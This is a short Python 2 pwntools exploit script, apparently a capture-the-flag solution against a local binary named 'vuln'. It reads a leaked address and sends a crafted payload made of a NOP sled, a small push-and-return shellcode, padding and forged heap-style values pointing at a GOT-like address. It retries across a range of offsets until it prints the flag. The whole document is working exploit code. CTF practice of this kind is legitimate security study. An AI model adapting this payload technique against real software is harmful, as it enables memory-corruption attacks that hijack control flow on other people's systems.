#! /usr/bin/env python2

from pwn import *

context.log_level = logging.CRITICAL

fail = True

#due to alignment maybe and other wizardry we need to check a bunch of different block sizes until it works.
for i in range(-16, 48):
    for n in range(10):
        try:
            p = process("./vuln")
            p.recvuntil("\n")
            addr = int(p.recvuntil('\n'))
            p.recvuntil('Input fullname\n')
            p.sendline('\x90'*40 + "\x68\x36\x89\x04\x08\xC3" + ('F'*618) + p32(0) + p32(0xFFFFFD57 + i) + p32(0x804D01C) + p32(addr))
            p.recvuntil("Input lastname\n")
            p.sendline('')
            print(p.recvuntil('}'))
            p.close()
            print("Found correction offset: " + str(i))
            fail = False
            break
        except:
            p.close()
            
if fail:
    print("Fail")